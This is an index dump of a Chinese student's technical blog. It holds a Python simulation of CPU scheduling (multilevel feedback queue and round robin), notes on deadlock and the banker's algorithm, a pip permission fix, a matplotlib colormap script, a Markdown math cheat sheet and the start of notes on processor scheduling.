t_time_block = 4 flag = 0 # 完成进程计数 running_time = 0 # 时钟模拟 processes_number = len(sum_processes) current_process = -1 # 当前进行进程，如果没有置为-1 f_processes.append(sum_processes[0]) while(flag != processes_number): # 判断在哪一个队列进行操作,选择当前要处理的进程 if f_processes: current_process = f_processes[0] current_process.pre_queue_tb = 1 current_process.pre_queue = 1 elif s_processes: current_process = s_processes[0] current_process.pre_queue = 2 current_process.pre_queue_tb = 2 elif t_processes: # 轮转法，重写 pre_processes = t_processes sum = len(t_processes) over_processes = [] # 完成队列 t_flag = 0 # 记录完成的进程数 # running_time = running_time time_block = 4 while (t_flag != sum): # 判断时间片是否大于剩余服务时间 if time_block \u0026gt;= pre_processes[0].left_serve_time: for i in range(pre_processes[0].left_serve_time): pre_processes[0].left_serve_time -= 1 running_time += 1 if pre_processes[0].left_serve_time == 0: # 计算完成时间 pre_processes[0].finish_time = running_time # 计算周转时间 pre_processes[0].cycling_time = pre_processes[0].finish_time \\ - pre_processes[0].arrive_time # 计算带权周转时间 pre_processes[0].w_cycling_time = float(pre_processes[0].cycling_time) / pre_processes[0].serve_time # 打印 print(\u0026#39;%s 进程已完成的进程，详细信息如下：\u0026#39; % pre_processes[0].name) print(\u0026#39;进程名称：%s ，完成时间： %d ，周转时间：%d ，带权周转\t时间： %.2f\u0026#39; ( pre_processes[0].name, pre_processes[0].finish_time, pre_processes[0].cycling_time, pre_processes[0].w_cycling_time)) t_flag += 1 over_processes.append(pre_processes.pop(0)) # 进程结束从就绪队列出队进完成队列 continue # 直接结束此次循环，下面内容不执行 else: # 剩余服务时间大于一个时间片 for i in range(time_block): pre_processes[0].left_serve_time -= 1 running_time += 1 # 一个时间片结束进程从队头切换至队尾 pre_processes.append(pre_processes.pop(0)) break # 在一个时间片内操作 for i in range(current_process.pre_queue_tb): current_process.left_serve_time -= 1 running_time += 1 out_ = 0 # 判断此时是否完成 if current_process.left_serve_time == 0: # 如果完成，弹出 # 计算完成时间 current_process.finish_time = running_time # 计算周转时间 current_process.cycling_time = current_process.finish_time \\ - current_process.arrive_time # 计算带权周转时间 current_process.w_cycling_time = float(current_process.cycling_time) / \\ current_process.serve_time # 打印 print(\u0026#39;%s 进程已完成的进程，详细信息如下：\u0026#39; % current_process.name) print(\u0026#39;进程名称：%s ，完成时间： %d ，周转时间：%d ，带权周转时间： %.2f\u0026#39; % (current_process.name, current_process.finish_time, current_process.cycling_time, current_process.w_cycling_time)) flag += 1 if current_process.pre_queue == 1: f_processes.pop(0) elif current_process.pre_queue == 2: s_processes.pop(0) else: t_processes.pop(0) current_process = -1 out_ = 1 elif i == current_process.pre_queue_tb-1 and current_process.left_serve_time != 0: # 一个时间片内未完成，进入下一队列 if current_process.pre_queue == 1: current_process.pre_queue = 2 current_process.pre_queue_tb = 2 s_processes.append(f_processes.pop(0)) elif current_process.pre_queue == 2: current_process.pre_queue = 3 current_process.pre_queue_tb = 4 t_processes.append(s_processes.pop(0)) # 判断此时有没有新进程入队，如果有，入队退出循环 for j in range(len(sum_processes)): if running_time == sum_processes[j].arrive_time: # 如果有新就绪队列 out = 1 # 判断当前是否有正在进行的进程 if current_process != -1: # 如果1队不空，加入一队 if f_processes: sum_processes[j].pre_queue = 1 sum_processes[j].pre_queue_tb = 1 f_processes.append(sum_processes[j]) break else: # 如果一队空 if current_process.pre_queue == 2: s_processes.append(s_processes.pop(0)) elif current_process.pre_queue == 3: t_processes.append(t_processes.pop(0)) current_process = sum_processes[j] current_process.pre_queue = 1 current_process.pre_queue_tb = 1 f_processes.append(current_process) break # 将此时进入进程置为当前处理的进程 else: # 如果没有，直接将新入队进程置为当前进程 sum_processes[j].pre_queue = 1 sum_processes[j].pre_queue_tb = 1 current_process = sum_processes[j] f_processes.append(current_process) break else: out = 0 if out == 1 or out_ == 1: break 测试样例 if __name__ == \u0026#39;__main__\u0026#39;: p1 = Process(\u0026#39;A\u0026#39;, 0, 3) # or p1 = Process(\u0026#39;A\u0026#39;, 0, 3, 2) 2为静态优先级 p2 = Process(\u0026#39;B\u0026#39;, 2, 6) p3 = Process(\u0026#39;C\u0026#39;, 4, 4) p4 = Process(\u0026#39;D\u0026#39;, 6, 5) p5 = Process(\u0026#39;E\u0026#39;, 8, 2) processes = [p1, p2, p3, p4, p5] working = xxxx(processes, 2) working.xxx() 小结 寒假快结束了，也没有学多少东西，导师的任务也只做了半吊子，GUI还是没做出来。写的算法里肯定还有错误，所有算法在测试样例中跑都是正确的。作业/进程结构中定义的一些譬如周转时间，带权周转时间如果需要使用，在一个作业/进程结束后计算就好，很多算法里没有加。\n当初写的时候，有上网查过想找参考，然而大部分是由C/C++写的。讲实话写了一段时间的python后一点都不想碰C/C++；能搜到的寥寥几篇python写的算法运行起来错误百出，我就想自己写吧还是，憋一点是一点。代码里的循环循环使得质量不佳，说白了写的跟shi一样。虽然我写的代码是s山，但是好歹是自己写的。在写RR和MFQ的时候，接近崩溃，调试一下午才勉勉强强弄完，学习之路还很长，我也希望有天我写的代码可以成为别人的祖传shi山。\n如果导师放过我，下面计划就是学习网络数据采集和数据分析，或许也会做一些前端的内容；反之就学习PyQt做界面，都很好。然后就是使劲学Java，学到暑假可以拿实习的程度。\n这篇文章如果可以给你提供帮助，我将很感谢你，如果有问题可以联系我，过段时间会添加评论系统（如果有好的插件的话）。今天是元宵节，祝大家节日快乐~\nGithub源码戳这里\n","date":"2019-02-19T09:06:30+08:00","permalink":"https://lizonglingo.github.io/p/python%E6%A8%A1%E6%8B%9F%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%84%E7%90%86%E6%9C%BA%E8%B0%83%E5%BA%A6/","title":"Python模拟操作系统处理机调度"},{"content":" 今天准备学习使用PyQt5，但是在安装的时候出现了问题，已解决。\n报错 使用pip安装PyQt5时，出现如下错误：\n操作文件夹拒绝访问，也就是没有修改文件内容的权限。\n解决 我们先到Anaconda文件夹下，右键installanaconda，点击属性进入：\n进入“安全”属性，选当前用户（一般为Users），单击编辑：\n然后我们把“完全控制”这个选项给点上，然后点击“应用”，注意是“应用”不是确定，我圈错了，是“应用”\n然后最好用管理员模式：\nwin + Q 输入命令提示符，右键，管理员模式运行，再次安装，就ok了，然后pip list看到已经安好了~\n","date":"2019-02-11T12:59:21+08:00","permalink":"https://lizonglingo.github.io/p/%E8%A7%A3%E5%86%B3%E4%BD%BF%E7%94%A8pip%E5%AE%89%E8%A3%85%E7%AC%AC%E4%B8%89%E6%96%B9%E5%8C%85%E5%87%BA%E7%8E%B0%E6%8B%92%E7%BB%9D%E8%AE%BF%E9%97%AE%E7%9A%84%E9%94%99%E8%AF%AF/","title":"解决使用pip安装第三方包出现‘拒绝访问’的错误"},{"content":" 今天用到颜色映射，就顺便整理一下使用matplotlib中的pyplot经常用到的颜色映射的一些参数，转自前辈的博文\nimport numpy as np import matplotlib.pyplot as plt # Have colormaps separated into categories: # http://matplotlib.org/examples/color/colormaps_reference.html cmaps = [(\u0026#39;Perceptually Uniform Sequential\u0026#39;, [\u0026#39;viridis\u0026#39;, \u0026#39;inferno\u0026#39;, \u0026#39;plasma\u0026#39;, \u0026#39;magma\u0026#39;]), (\u0026#39;Sequential\u0026#39;, [\u0026#39;Blues\u0026#39;, \u0026#39;BuGn\u0026#39;, \u0026#39;BuPu\u0026#39;, \u0026#39;GnBu\u0026#39;, \u0026#39;Greens\u0026#39;, \u0026#39;Greys\u0026#39;, \u0026#39;Oranges\u0026#39;, \u0026#39;OrRd\u0026#39;, \u0026#39;PuBu\u0026#39;, \u0026#39;PuBuGn\u0026#39;, \u0026#39;PuRd\u0026#39;, \u0026#39;Purples\u0026#39;, \u0026#39;RdPu\u0026#39;, \u0026#39;Reds\u0026#39;, \u0026#39;YlGn\u0026#39;, \u0026#39;YlGnBu\u0026#39;, \u0026#39;YlOrBr\u0026#39;, \u0026#39;YlOrRd\u0026#39;]), (\u0026#39;Sequential (2)\u0026#39;, [\u0026#39;afmhot\u0026#39;, \u0026#39;autumn\u0026#39;, \u0026#39;bone\u0026#39;, \u0026#39;cool\u0026#39;, \u0026#39;copper\u0026#39;, \u0026#39;gist_heat\u0026#39;, \u0026#39;gray\u0026#39;, \u0026#39;hot\u0026#39;, \u0026#39;pink\u0026#39;, \u0026#39;spring\u0026#39;, \u0026#39;summer\u0026#39;, \u0026#39;winter\u0026#39;]), (\u0026#39;Diverging\u0026#39;, [\u0026#39;BrBG\u0026#39;, \u0026#39;bwr\u0026#39;, \u0026#39;coolwarm\u0026#39;, \u0026#39;PiYG\u0026#39;, \u0026#39;PRGn\u0026#39;, \u0026#39;PuOr\u0026#39;, \u0026#39;RdBu\u0026#39;, \u0026#39;RdGy\u0026#39;, \u0026#39;RdYlBu\u0026#39;, \u0026#39;RdYlGn\u0026#39;, \u0026#39;Spectral\u0026#39;, \u0026#39;seismic\u0026#39;]), (\u0026#39;Qualitative\u0026#39;, [\u0026#39;Accent\u0026#39;, \u0026#39;Dark2\u0026#39;, \u0026#39;Paired\u0026#39;, \u0026#39;Pastel1\u0026#39;, \u0026#39;Pastel2\u0026#39;, \u0026#39;Set1\u0026#39;, \u0026#39;Set2\u0026#39;, \u0026#39;Set3\u0026#39;]), (\u0026#39;Miscellaneous\u0026#39;, [\u0026#39;gist_earth\u0026#39;, \u0026#39;terrain\u0026#39;, \u0026#39;ocean\u0026#39;, \u0026#39;gist_stern\u0026#39;, \u0026#39;brg\u0026#39;, \u0026#39;CMRmap\u0026#39;, \u0026#39;cubehelix\u0026#39;, \u0026#39;gnuplot\u0026#39;, \u0026#39;gnuplot2\u0026#39;, \u0026#39;gist_ncar\u0026#39;, \u0026#39;nipy_spectral\u0026#39;, \u0026#39;jet\u0026#39;, \u0026#39;rainbow\u0026#39;, \u0026#39;gist_rainbow\u0026#39;, \u0026#39;hsv\u0026#39;, \u0026#39;flag\u0026#39;, \u0026#39;prism\u0026#39;])] nrows = max(len(cmap_list) for cmap_category, cmap_list in cmaps) gradient = np.linspace(0, 1, 256) gradient = np.vstack((gradient, gradient)) def plot_color_gradients(cmap_category, cmap_list): fig, axes = plt.subplots(nrows=nrows) fig.subplots_adjust(top=0.95, bottom=0.01, left=0.2, right=0.99) axes[0].set_title(cmap_category + \u0026#39; colormaps\u0026#39;, fontsize=14) for ax, name in zip(axes, cmap_list): ax.imshow(gradient, aspect=\u0026#39;auto\u0026#39;, cmap=plt.get_cmap(name)) pos = list(ax.get_position().bounds) x_text = pos[0] - 0.01 y_text = pos[1] + pos[3]/2. fig.text(x_text, y_text, name, va=\u0026#39;center\u0026#39;, ha=\u0026#39;right\u0026#39;, fontsize=10) # Turn off *all* ticks \u0026amp; spines, not just the ones with colormaps. for ax in axes: ax.set_axis_off() for cmap_category, cmap_list in cmaps: plot_color_gradients(cmap_category, cmap_list) plt.show() 这样，我们得到matplotlib中内嵌的colormaps：\n或者访问 http://matplotlib.org/ -\u0026gt; Examples -\u0026gt; Color Examples -\u0026gt; colormaps_reference\n顺便安利一下《流浪地球》！\n","date":"2019-02-09T11:15:53+08:00","permalink":"https://lizonglingo.github.io/p/matplotlib%E4%B8%ADpyplot%E9%A2%9C%E8%89%B2%E6%98%A0%E5%B0%84%E5%8F%82%E6%95%B0%E6%95%B4%E7%90%86/","title":"matplotlib中pyplot颜色映射参数整理"},{"content":" 接处理机调度与死锁（一），本篇主要讲述死锁部分内容。\n四.死锁概述 本节排版有些问题，可以先看本章第三部分对死锁概念的解释及定义，之后再来看第二部分计算机系统中的死锁可能会更好理解。\n1.资源问题 引起死锁的资源类型：临界资源（需要互斥访问，不可被抢占的资源）。 （1）可重用性资源和消耗性资源 可重用性资源 1）独占使用，不允许共享。\n2）使用方法：请求资源 ——\u0026gt; 使用资源 ——\u0026gt; 释放资源\n3）在系统中数量相对固定，进程在运行期间不能创建和删除。\n可消耗性资源（临时性资源） 1）在系统中数量可以不断变化\n2）进程在运行过程中可以（生产者）创造和（消费者）消耗。\n（2）可抢占性资源和不可抢占性资源 可抢占性资源：\u0026lt; 处理机 \u0026gt; \u0026lt; 内存 \u0026gt; 不可抢占性资源：\u0026lt; 磁带机 \u0026gt; \u0026lt; 刻录机 \u0026gt; \u0026lt; 打印机 \u0026gt; 2.计算机系统中的死锁 死锁的起因：源于多个进程对资源的竞争，包括不可抢占性资源和可消耗性资源。 （1）竞争不可抢断性资源引起死锁 共享文件时的死锁情况：\n（2）竞争可消耗性资源引起死锁 进程之间通信时的死锁：\n（3）进程推进顺序不当引起死锁 进程推进顺序对死锁的影响：\n3.死锁的定义、必要条件和处理方法 （1）死锁的定义 死锁：如果一组进程中的每一个进程都在等待仅由该进程中的其他进程才能引发的事件，那么该组进程就是死锁的（Deadlock）。 饥饿与死锁：\n饥饿：线程无限等待 例如：低优先级的线程等待着不断被高优先级线程所使用的资源。\n死锁：等待资源形成环路 线程A拥有资源1并且等待资源2\n线程B拥有资源2并且等待资源1\n死锁 ——\u0026gt; 饥饿（反之不成立） 饥饿可以结束（但不是必须的）\n死锁如果没有外力介入无法结束\n（2）产生死锁的必要条件 产生死锁必须同时具备以下四个必要条件：\n互斥条件：要求在一段时间内某资源仅被一进程占用。 请求和保持条件：当前已拥有资源的进程，仍能申请新的资源；而且，当该进程因新的资源被其他进程占用而阻塞时，对已获得的资源保持不放。 不可抢占条件：进程已获得的资源，只能在使用完时自行释放。 循环等待条件：在发生死锁时，必然存在一个进程 —— 资源的环形链。即进程集合{ $P_0 , P_1 , \u0026hellip;. , P_n$ } 对资源的请求成环状：$ P_0 -\u0026gt; P_1 -\u0026gt; P_2 -\u0026gt; \u0026hellip; P_n -\u0026gt; P_0$ （3）处理死锁的方法 预防死锁 1）通过设置某些条件，以破坏产生死锁的四个必要条件之一的一个或几个条件，来防止发生死锁。\n2）易实现，但可能导致资源利用率和系统吞吐量低。\n避免死锁 1）在资源的动态分配过程中，用某种方法去防止系统进入不安全状态，从而避免发生死锁。\n2）可获得较高的资源利用率和系统吞吐量，但难度较大。\n检测死锁 1）通过系统设置的检测机构，及时地检测出死锁的发生，并精确地确定与死锁有关的进程和资源；然后采取适当措施。\n2）从系统中将已发生的死锁清除掉，需要采用一些用于强制性抢夺资源或者终止任务的技术。\n解除死锁 常用方法：撤销或挂起一些进程，回收资源分配给其他处于阻塞的进程。\n特点：资源利用率好，系统吞吐量大。实现难度最大。\n六.预防死锁 预防死锁的方法 使四个必要条件中的第2、3、4条件中的一个或者几个不能成立，以防止发生死锁。\n1）方法一：破坏“请求和保持”条件\n2）方法二：破坏“不可抢占”条件\n3）方法三：破坏“循环等待”条件\n1.破坏“请求和保持”条件 破坏“请求和保持”条件：系统确保当一个进程在请求资源时，它不能持有不可抢占的资源。 （1）第一种协议（预先静态分配法） 系统要求所有进程在开始运行之前，必须一次性地申请在整个运行过程中所需要的全部资源。 破坏“请求”条件：进程在整个运行期间，不会再提出资源要求\n破坏“保持”条件：等待期间进程未占有任何资源\n优点：简单、易于实现、安全 缺点：资源浪费严重，进程经常发生饥饿现象 （2）第二种协议（阶段性资源分配法） 允许一个进程只获得运行初期所需的资源后便开始运行，进程运行过程中再逐步释放已经分配给自己、且已用毕的全部资源，然后再请求新的所需资源。 2.破坏“不可抢占资源”条件 当一个已经保持了某些不可被抢占资源的进程，提出新的资源请求而不能得到满足时，它必须释放已经保持的所有资源，待以后需要时再重新申请。 实现难度较大，且要付出很大代价。 反复申请和释放资源，使进程的执行无限地推迟。延长进程的周转时间，增加系统开销，降低系统吞吐量。 3.破坏“循环等待”条件 系统将所有资源类型按线性排序，并赋予不同的序号，所有进程对资源的请求必须严格按资源序号递增的次序提出。这样，在资源分配图中，不会出现环路，因此摒弃了“环路等待”条件。 优点：与前两种策略相比，资源利用率和系统吞吐量都有明显提高。 缺点 1）限制新设备类型的增加\n2）作业（进程）使用各类资源的顺序，与系统规定顺序不同而造成资源浪费\n3）限制用户的自主编程\n七.避免死锁 1.系统安全状态 避免死锁的方法：将系统的状态分为安全状态和不安全状态，只要系统的状态处于安全状态，便可避免发生死锁。 资源分配方法：允许进程动态地申请资源，系统在进行分配之前，先计算资源分配的安全性。若此次分配不会导致系统进入不安全状态，便将资源分配给进程；否则，进程等待。 （1）安全状态 安全状态：指系统能按照某种进程推进顺序如 \u0026lt; $P_1 , P_2 , P_3 , \u0026hellip; , P_n$ \u0026gt; （称 \u0026lt; $P_1 , P_2 , P_3 , \u0026hellip; , P_n$ \u0026gt; 为安全序列），来为每个进程分配其所需资源，直至最大需求，使每个进程都顺利完成。 不安全状态：不存在安全序列的状态。 避免死锁的实质：如何使系统不进入不安全状态。 结论：并非所有不安全状态都是死锁状态，但只要系统处于安全状态便可避免死锁状态。 （2）安全状态举例 不按照安全序列分配资源，则系统可能会由安全状态进入不安全状态。\n2.利用银行家算法避免死锁 （1）银行家算法中的数据结构 可利用资源向量 Available ：是一个含有 m 个元素的数组，其中每一个元素代表一类可利用的资源数目，其初始值使系统中所配置的该类全部可用资源数目。其值随资源的分配和回收而动态地改变。 最大需求矩阵 Max ：是一个 n×m 的矩阵，定义了系统中 n 个进程中的每一个进程对 m 类资源的最大需求。 分配矩阵 Allocation ：是一个 n×m 的矩阵，定义了系统中每一类资源当前__已分配__给每一进程的资源数。 需求矩阵 Need ：是一个 n×m 的矩阵，表示每一个进程尚需的该类资源数。 银行家算法中的数据结构\nint n; //系统中进程的总数 int m; //资源类总数 int Available[m]; int Max[n,m]; int Allocation[n,m]; int Need[n,m]; int Request[n,m]; 上述三个矩阵的关系 Need[ i , j ] = Max[ i , j ] - Allocation[ i , j ]\n其中：\nNeed[ i , j ] = k表示进程 i 还需要 $R_j$ 类资源 k 个。\nMax[ i , j ] = k表示进程 i 还需要 $R_j$ 类资源的最大数目为 k。\nAllocation[ i , j ] = k表示进程 i 当前已分得 $R_j$ 类资源的数目为。\nAvailable[ j ] = k表示系统中现有 $R_j$ 类资源 k 个。\n（2）银行家算法 设$Request_i$是进程$P_i$的请求向量。\n例：$Request_i$[ j ] = k\n（3）安全性算法 为进行安全性检查，定义数据结构： int Work[m]; int Finish[n]; 安全性检查步骤 1）Work = Available Finish[ i ] = false\n2）寻找满足条件的 i ：\nFinish[ i ] = false \u0026amp;\u0026amp; Need[ i , j ] \u0026lt;= Work\nif not find\n转4）\n3）Work[ i ] = Work[ i ] + Allocation[ i , j ] \u0026amp;\u0026amp; Finish[ i ] = true 转2）\n4）若对所有 i ，Finish[ i ] = true都满足，则系统处于安全状态，否则处于不安全状态\n（4）银行家算法举例 假定系统中有五个进程｛$ P_0 , P_1 , P_2 , P_3 , P_4$｝和三类资源｛A, B, C｝，各种资源的数量分别为10、5、7。\n$T_0$时刻资源分配表：\n工作向量Work，它表示系统可提供给进程所需运行时间的各类资源的数目\n$T_0$时刻的安全序列：\n当$P_1$发出请求向量Request（1，0，2）\n系统作如如下动作：\n1）合理性检查：$Request_i(1,0,2) \u0026lt;= Need_i(1,2,2)$\n2）查库存：$Request_i(1,0,2) \u0026lt;= Available(1,2,2)$\n3）试分配\n4）安全性检查\n5）得出结论：因为可以找到一个安全序列{$P_1,P_2, P_4,P_0, P_2$}，系统是安全的，所以可以满足P1的资源申请\n若P4发出请求向量Request（3，3，0）\n这种情况，就不能满足要求。$P_4$就需要继续等待。\n若P0发出请求向量Request（0，2，0）\n系统进行如下操作：\n1）合理性检查：$Request_0$（0，2，0） \u0026lt;= $Need_0$（7，4，3）\n2）查库存：$Request_0$（0，2，0） \u0026lt;= $Available$（2，3，0）\n3）试分配\n4）安全性检查\n5）结论：可用资源Available(2,1,0)已不能满足任何进程的需要，系统进入不安全状态，拒绝$P_0$的资源申请。\n八.死锁的检测与解除 1.死锁的检测 当系统为进程分配资源时，若未采取任何限制措施，则系统必须提供检测和解除死锁的手段。为此系统必须有：\n1）保存有关资源的请求和分配信息\n2）提供一种算法，以利用这些信息来检测系统是否已进入死锁状态\n检测时机：\n1）进程等待时检测死锁（其缺点是系统的开销大）\n2）定时检测\n3）系统资源利用率下降时检测死锁\n（1）资源分配图 （2）死锁定理 充分条件：当且仅当系统某状态S所对应的资源分配图是不可完全简化的，则S是死锁状态，而不可化简的进程是被死锁的进程。\n完全简化：通过一系列简化后，所有的进程都成为孤立节点。\n不可能完全简化：通过任何过程都不能使图完全简化。。\n资源分配图的简化\n（3）死锁检测中的数据结构 可利用资源向量Available，它表示了m 类资源中每一类资源的可用数目。\n把不占用资源的进程（向量Allocation = 0）记入L表中， 即$L_i$∪L。\n从进程集合中找到一个$Request_i$ ≤ Work的进程，做如下处理：\n将其资源分配图简化，释放出资源，增加工作向量Work = Work + $Allocation_i$。 将它记入L表中。\n若不能把所有进程都记入L表中，便表明系统状态S的资源分配图是不可完全简化的。因此，该系统状态将发生死锁。 Work = Available; L = {Li | Allocationi=0 ∩ Requesti=0} //孤立进程点 for (all Li 不属于 L) { For (all Requesti \u0026lt;= Work) { Work = Work + Allocationi; Li∪L } } deadlock = not (L={P1, P2, …, Pn}) 2.死锁的解除 当发现有进程死锁时，便应立即把它们从死锁状态解脱出来，常采用的两种方法是：\n1）剥夺资源：从其它进程剥夺足够数量的资源给死锁进程。\n2）撤消进程：\n最简单的方法是撤消全部死锁的进程，使全部死锁进程都夭折掉。\n稍微温和一点的方法是按照某种顺序逐个地撤消进程，直至有足够的资源可用，死锁状态消除为止。\n对撤消进程方法，选择原则可采用下面的一种：\n1）目前为止消耗的处理机时间最少；\n2）目前为止产生的输出最少；\n3）预计剩下的时间最长；\n4）目前为止分配的资源总量最少；\n5）优先级最低。\n为把系统从死锁状态中解脱出来，所花费的代价可表示为：\n$ R(S){min} = min{C{ui}}+min{C_{uj}}+min{C_{uk}}+…$\n付出代价最小的死锁解除方法：\n更新于 2019/01/26 \u0026mdash; 16:39\n","date":"2019-01-26T10:24:20+08:00","permalink":"https://lizonglingo.github.io/p/%E5%A4%84%E7%90%86%E6%9C%BA%E8%B0%83%E5%BA%A6%E4%B8%8E%E6%AD%BB%E9%94%81%E4%BA%8C/","title":"处理机调度与死锁（二）"},{"content":" 我们在使用markdown编辑时，是会有数学公式语法的。\n基本语法对照表 嵌入行内的公式用$包裹，如：行内公式展示$a = b + c$，效果为：\n行内公式展示a=b+ca=b+c\n换行居中独立模块展示可以用$$包裹，如：模块展示$$a = b + c$$，效果为：\n模块展示\na=b+ca=b+c\n基本 名称 语法 显示 备注 约等于 \\approx ≈ 不等于 \\neq ≠ 小于等于 大于等于 \\leq \\geq ≤ ≥ 乘以 除以 \\times \\div × ÷ 加减 \\pm ± 上标 x^y $x^y$ 上标 x^{y^z} $x^{y^z}$ {}扩住作为整体的y^z 下标 x_n $x_n$ 下标 x_{n_0} $x_{n_0}$ {}扩住作为整体的n_0 开根号 \\sqrt[n] x $\\sqrt[n]x$ 分数 \\frac{1}{3} 或 1 \\over 3 $\\frac{1}{3}$或 $1 \\over 3$ 向量 \\vec{a} \\cdot \\vec{b} $\\vec{a} \\cdot \\vec{b}$ 省略号 x_0, \\ldots, x_n $x_0, \\ldots, x_n$ 与文本底线对齐的省略号 特殊运算符 名称 语法 显示 备注 累加 \\sum_{i=0}^n x_i $\\sum_{i=0}^n x_i$ 累乘 \\prod_{i=1}^n x_i $\\prod_{i=1}^n x_i$ 极限 \\lim_{x \\to +\\infty} \\frac{1}{x} $\\lim_{x \\to +\\infty} \\frac{1}{x}$ 积分 \\int_0^1 x^2 {\\rm d}x $\\int_0^1 x^2 {\\rm d}x$ 双重积分 \\iint_1^\\infty {1 \\over x} {\\rm d}x $\\iint_1^\\infty {1 \\over x} {\\rm d}x$ 分情况 f(x)= \\begin{cases} x, x\u0026gt;0 \\\\\\ -x,x\u0026lt;0 \\end{cases} $f(x)= \\begin{cases} x, x\u0026gt;0 \\\\ -x,x\u0026lt;0 \\end{cases}$ \\\\\\代表换一行或者分一种情况 括号 () [] \\{\\} \\lbrace \\rbrace $() [] {} \\lbrace \\rbrace$ 因为{}本身有标明整体的含义 大括号 \\left( f(x) = \\int_0^1 x^2 {\\rm d}x \\right) $\\left( f(x) = \\int_0^1 x^2 {\\rm d}x \\right)$ 在括号前加上\\left和\\right 因为所以 \\because \\therefore ∵ ∴ 左右上下标 \\sideset{^n_k}{^x_y}a $\\sideset{^n_k}{^x_y}a$ 希腊字母 名称 语法 显示 α \\alpha α β \\beta β γ \\gamma γ δ \\delta δ Δ \\Delta Δ θ \\theta θ Θ \\Theta Θ References https://github.com/hexojs/hexo-math http://theme-next.iissnan.com/third-party-services.html#mathjax http://bennychen.me/mathjax.html http://daniellaah.github.io/2016/Mathmatical-Formula-within-Markdown.html http://stevenshi.me/2017/06/26/hexo-insert-formula/ 前辈的文章写的非常详细，有需要的朋友可以按照这个配置。\n原文链接：Dreamland ","date":"2019-01-22T23:19:38+08:00","permalink":"https://lizonglingo.github.io/p/markdown%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/","title":"MarkDown数学公式"},{"content":" 今天考完科目三之后接到导师的任务，关于处理机和死锁的算法问题，要求图形界面及动画演示(基于Python)。真的哭辽，完全没有头绪···在这里记录学习和解决的过程。\n目录：\n处理机调度的层次和调度算法的目标 作业与作业调度 进程调度 实时调度 死锁概述 预防死锁 避免死锁 死锁的检测与接触 一.处理机调度的层次和调度算法的目标 处理机是计算机系统中的重要资源。处理机调度算法对整个计算机系统的综合性能指标有重要影响。\n从处理机调度的分类：\n高级调度（作业调度）：作业调度的周期较长，几分钟一次。 中级调度（内外存交换）：介于高级与低级之间。 低级调度（进程调度）：运行频率最高，10~100ms一次。 1.处理机调度层次 高级调度 低级调度 中级调度 （1）高级调度\n高级调度又称为“作业调度”“长程调度”“接纳调度”。\n主要功能：根据某种算法，把外存上处于后备队列中的那些作业调入内存。\n主要任务：\u0026lt; 选择作业 \u0026gt; \u0026lt; 为作业创建进程 \u0026gt; \u0026lt; 分配资源 \u0026gt; \u0026lt; 插入就绪队列 \u0026gt;\n应用范围：\u0026lt; 批处理系统中配有作业调度 \u0026gt; \u0026lt; 分配和实时系统中通常没有作业调度 \u0026gt;\n（2）低级调度\n低级调度又称为“进程调度”或“短程调度”。\n主要功能：根据某种算法，决定就绪队列中哪个进程先获得处理机，然后再由分派程序执行将处理机分配给进程的操作。\n主要任务：\u0026lt; 保存处理机的现场信息 \u0026gt; \u0026lt; 按某种算法选取进程 \u0026gt; \u0026lt; 分配处理器 \u0026gt;\n（3）中级调度\n中级调度又称“内存调度”或“中程调度”。\n主要目的：缓解内存紧张情况，提高内存利用率和系统吞吐量。\n主要功能：按一定算法在内存和外存之间进行进程对换。\n主要任务：是将内存中处于阻塞状态的某些进程换至外存，腾出内存空间以便将外存上已具备执行条件的进程换入内存。\n应用范围：分时系统和具有虚拟存储器的系统中。\n2.处理机调度算法的目标 （1）处理机调度算法的共同目标 资源利用率 $ CPU资源利用率 = \\frac{CPU有效工作时间} {CPU有效工作时间 + CPU空闲等待时间} $\n公平性 \u0026lt; 不出现进程饥饿现象 \u0026gt; \u0026lt; 公平性是相对的 \u0026gt;\n平衡性 合理安排不同类型的作业，CPU繁忙型、I/O繁忙型。\n策略强制执行 根据需要准确执行所定制的策略。\n（2）批处理系统的目标 平均周转时间短 周转时间（$T_i$）：指从作业（进程）被提交给系统开始，到作业完成为止的这段时间间隔。\n$ T=\\frac{1}{n}\\sum_{i=1}^n T_i $\n带权周转时间（W）：用于反应调度性能的指标，$ W=\\frac{T}{T_s} $ （$T_s$为实际处理时间)\n平均带权周转时间：$ W=\\frac{1}{n}\\sum_{i=1}^n\\frac{T_i}{T_s} $\n系统吞吐量高 吞吐量：单位时间内系统所完成的作业数。\n策略：选择短服务业运行。\n处理机利用率高 策略：选择计算量大的作业运行。\n（3）分时系统的目标 响应时间快 响应时间：从用户通过键盘提交一个请求开始，到首次产生响应为止（显示出结果）的一段时间间隔。\n包括这三部分：\n把请求信息从键盘传送到处理机的时间。 处理机对请求信息进行处理的时间。 将响应信息回送到终端显示器的时间。 均衡性 均衡性：指系统响应时间的快慢应与用户所请求服务的复杂性相适应。\n（4）实时系统的目标 截至时间的保证 截至时间：某任务必须开始或完成的最迟时间。\n（这是实时系统调度算法的一个主要目标；HRT任务与SRT任务对截止时间的要求有所差异。）\n可预测性 如多媒体系统中的视频播放就提供了请求的可预测性。\n二.作业与作业调度 1.批处理系统中的作业 （1）作业和作业步 作业：由程序、数据及作业说明书三部分组成。 作业步（Job Step）：作业运行期间，每个作业都必须经过若干个相对独立，又相互关联的顺序加工步骤才能得到结果，其中每一个加工步骤又称为一个作业步： \u0026lt; “编译”作业步 \u0026gt; \u0026lt; “链接装配”作业步 \u0026gt; \u0026lt; “运行”作业步 \u0026gt;\n（2）作业控制块 作业控制块 是作业在系统中存在的标志，保存了系统对作业进行管理和调度的全部信息。通常包括：作业标识、用户名称、用户帐户、作业类型、作业状态、调度信息、资源需求、进入系统时间、开始处理时间、作业完成时间、作业退出时间、资源使用情况等。\n作业的生命周期 作业进入系统时，由“作业注册”程序为作业建立JCB，然后根据作业类型将其放到相应的作业后备队列等待调度；\n调度程序按一定的调度算法将调度到的作业装入内存；\n作业运行期间，系统按照JCB中的信息对作业进行控制；\n作业执行结束，系统负责回收它的资源，撤消它的JCB。\n（3）作业运行的三个阶段和三种状态 作业运行的三个阶段 收容阶段\n运行阶段\n完成阶段\n作业的三种状态 后备状态\n运行状态\n完成状态\n2.作业调度的主要任务 执行调度时的要解决的问题 接纳多少个作业。\n接纳哪些作业（由调度算法决定，如FCFS、SJF、优先级调度算法等）。\n作业调度的应用范围 批处理系统中配有作业调度。\n分时和实时系统中通常没有作业调度，但有接纳控制措施。\n3.先来先服务调度算法（FCFS）和短作业优先调度算法（SJF） （1）FCFS 作业调度 